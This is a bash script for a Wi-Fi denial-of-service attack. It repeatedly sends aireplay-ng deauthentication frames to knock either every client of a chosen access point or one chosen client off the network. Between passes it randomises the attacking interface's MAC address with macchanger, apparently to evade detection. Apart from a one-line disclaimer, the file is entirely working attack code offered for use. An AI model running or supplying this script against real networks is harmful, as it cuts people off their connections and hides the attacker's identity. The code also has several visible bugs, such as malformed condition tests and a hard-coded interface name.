#!/bin/bash
#Marc Pascual, 17/4/2017, Last Modification:17/4/2017
#This program performs a denial of service either to all of the current users of a network, or just to a particular client
#DISCLAMER: Use this program under an allowed targed. I take no responsibility for bad pratice.
 
scriptName=dos.sh #must match the current filename


echo "Created on 17/07/2017 by Marc Pascual i Solé. Mail me at marc.ps.12@gmail.com or mpasole@protonmail.com"
sleep 1.5
echo "Last Modification:" $(stat $scriptName | grep Modify | gawk '{ FS = " " } {print $2}')
sleep 1.5
echo "IMPORTANT: Run this command with SOURCE"
sleep 1.5
echo "WARNING: It is assumed that the following variables are set:"
echo "				1) dMAC: $dMAC"
echo "				2) interface : $interface"
echo "				3) dClient (only for the client attack): $dClient "
sleep 2


############ It will run until user cancellation ##################

echo  -n "type 1 for massive denial or 2 for client denial [1/2]: "
#Just waits for 1 digit to be pressed:
read  -n 1 dosType
echo

counter=1 #We set the counter to pass 1
case $dosType in

	"1")
		if (["$dMAC" == ""] || ["$interface" == ""]); then
			echo "Some of the variables are not set!"
			echo "Exitting..."
			break
		fi

		while true
		do
			#Does 10 deauth processes:
			aireplay-ng -0 10 -a $dMAC  $interface

			############################################################################################
			echo
			ifconfig $interface down
                        echo "$interface interface is now down"
                        sleep 0.2

                        iwconfig $interface mode monitor | grep "nothing"
                        #Takes the information from the iwconfig command!
                        echo "$interface interface is now in:" $(iwconfig wlp2s0 | grep Mode | gawk '{ FS = " "} {printf $4}' && echo)
                        sleep 0.5

                        #We change the MAC Address of the interface:
                        sudo macchanger wlp2s0 -r | grep "nothing"
                        echo "$interface has now the MAC Adress:" $(macchanger wlp2s0 -s | grep "Current MAC" | gawk '{ FS = " "} {print $3}')
                        sleep 0.5

                        ifconfig $interface up
                        echo "$interface interface is now up"

                        echo "please wait......"
                        sleep 2

                        counter=$[$counter + 1]
                        echo "deauthenticating all stations in Access Point:" $dMAC
			echo "Pass number $counter"
			echo
			sleep 1
			###################################################################################
		done
		;;

	#If dosType is set to 2, the CLIENT ATTACK will begin: 
	"2")
		#if (["$dMAC" == ""] || ["$interface" == ""] || [("$dClient" == ""]); then
		#	echo "some of the variables are not set!"
		#	echo "Exitting...."
		#	break
		#fi
		while true
		do

			aireplay-ng -0 10 -a $dMAC  -c $dClient $interface
			sleep 1
			echo
			ifconfig $interface down
               	 	echo "$interface interface is now down"
                	sleep 0.2

                	#Takes the information from the iwconfig command!
                	echo "$interface interface is now in:" $(iwconfig wlp2s0 | grep Mode | gawk '{ FS = " "} {printf $4}' && echo)
                	sleep 0.5

			#We change the MAC Address of the interface:
			sudo macchanger wlp2s0 -r | grep "nothing"
	 		echo "$interface has now the MAC Adress:" $(macchanger wlp2s0 -s | grep "Current MAC" | gawk '{ FS = " "} {print $3}')
			sleep 0.5

                	ifconfig $interface up
                	echo "$interface interface is now up"

                	echo "please wait......"
			sleep 2

			counter=$[$counter + 1]
			echo "deauthenticating client with MAC:" $dClient" in Access Point" $dMAC
			echo "Pass number $counter"
			echo
			sleep 1
		done
		;;


	*)
		echo "Incorrent option. Please try again"
		sleep 1
		echo
		echo
		./"$scriptName"
		;;
esac
